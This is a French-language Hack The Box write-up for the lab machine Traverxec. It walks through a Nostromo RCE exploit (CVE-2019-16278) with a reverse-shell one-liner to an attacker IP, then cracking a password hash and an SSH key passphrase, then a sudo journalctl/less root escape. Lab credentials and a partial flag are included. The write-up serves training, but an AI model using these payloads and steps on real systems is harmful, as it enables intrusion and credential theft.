---
title: HTB | Traverxec
description: Traverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user david. A bash script in the user's home directory reveals that the user can execute journalctl as root. This is exploited to spawn a root shell.
slug: traverxec-htb
date: 2025-01-23 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Traverxec cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Traverxec</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.165</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
david : `Nowonly4me`

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -T4 -vvv 10.10.10.165
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack nostromo 1.9.6
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
```

## Foothold

### cve2019-16278 - RCE
Detail: Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.
On peut se balader dans le PATH avec des "../" jusqu'a atteindre le binaire "/bin/sh" et executer n'importe quelle commande.

L'exploit est défini comme suit:
```bash
def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)
```

```bash
┌──(kali㉿kali)-[~/htb/Traverxec]
└─$ python2 47837.py 10.10.10.165 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.6 1337 >/tmp/f"


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/


--------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.165] 57934
bash: cannot set terminal process group (444): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ export TERM=xterm
export TERM=xterm
www-data@traverxec:/usr/bin$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1337

www-data@traverxec:/usr/bin$
```

### david user infos - conf nostromo
En fouillant dans les dossier de l'application web "nostromo", on trouve un fichier de configuration. Il nous indique un fichier d'authentification "/var/nostromo/conf/.htpasswd". On y retrouve le mot de passe de l'utilisateur david :
```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
## MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

## LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

## SETUID [RECOMMENDED]

user                    www-data

## BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

## ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

## HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
On utilise hashcat pour casser le mot de passe :
```bash
hashcat -m 500 hash.txt ~/wordlists/rockyou.txt -O -w 3 --show
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```
Credentials de david ?
david : `Nowonly4me` ?

Il semble qu'un dossier de david est accessible, comme préciser dans la configuration de nostromo "public_www". On y découvre une archive .tgz du nom de "backup-ssh-identity-files.tgz".

```bash
www-data@traverxec:/home/david$ cd public_www
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area/
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
...
cd /tmp
tar -xvfz ...
...
www-data@traverxec:/tmp/home/david/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```
On trouve une paire de clés SSH.

### ssh2john - cracking ssh key file
On trouve le mot de passe de la clé ssh.
Password: `hunter`
```bash
┌──(kali㉿kali)-[~/htb/Traverxec]
└─$ ssh2john ./id_rsa 
./id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/htb/Traverxec]
└─$ vim a          
                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/Traverxec]
└─$ john a --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (?)     
1g 0:00:00:00 DONE (2025-01-22 09:34) 20.00g/s 2880p/s 2880c/s 2880C/s carolina..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### David access - user flag
```bash
┌──(kali㉿kali)-[~/htb/Traverxec]
└─$ ssh david@traverxec.htb -i id_rsa
Enter passphrase for key 'id_rsa': hunter
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ whoami
david
```
### Bonus: delete password on ssh key
```bash
┌──(kali㉿kali)-[~/htb/Traverxec]
└─$ ssh-keygen -p -f ./id_rsa
Enter old passphrase: hunter
Enter new passphrase (empty for no passphrase): (empty)
Enter same passphrase again: (empty)
Your identification has been saved with the new passphrase.
```

## Privilege Escalation

### server-stats.sh
Dans le script **server-stats.sh** on observe une commande qui peut etre executé en tant que root sans mot de passe pour david. Cela utilise le binaire journalctl pour afficher des logs.
```bash
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

### exploit journalctl (gtfobins)
Sur gtfobins on trouve un moyen d'exploiter ce binaire. En effet, journalctl utilise "less" pour afficher les données. Or less peut etre exploiter, en marquant "!/bin/sh" on peut ouvrir un shell a l'interieur du programme, ce qui nous donne un accès root.
CEPENDANT !! Quand je suis connecté en ssh a david, la commande journalctl n'executait pas avec less. Ou alors le less se stoppait instantanément, donc imporssible de faire l'exploit...

Après vérification de la solution, en se connectant en ssh depuis le shell obtenu avec le user www-data, less est bien executé... Et on peut faire l'exploit. Je pense qu'il s'agit d'un probleme dans l'environnement du shell utiliser qui doit etre différent. Au niveau des variables qui permette le pagineur utilisé par journalctl.

https://gtfobins.github.io/gtfobins/journalctl/
```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2025-01-22 07:27:34 EST, end at Thu 2025-01-23 03:55:56 EST
Jan 22 08:09:14 traverxec su[1018]: pam_unix(su-l:auth): authentication failure;
Jan 22 08:09:16 traverxec su[1018]: FAILED SU (to root) www-data on pts/0
Jan 22 08:15:57 traverxec su[1055]: pam_unix(su:auth): authentication failure; l
Jan 22 08:15:59 traverxec su[1055]: FAILED SU (to david) www-data on pts/0
Jan 22 09:07:03 traverxec nhttpd[1201]: /../../../../bin/sh sent a bad cgi heade
!/bin/sh
# whoami
root
# cat /root/root.txt       
ad59.....6f01
```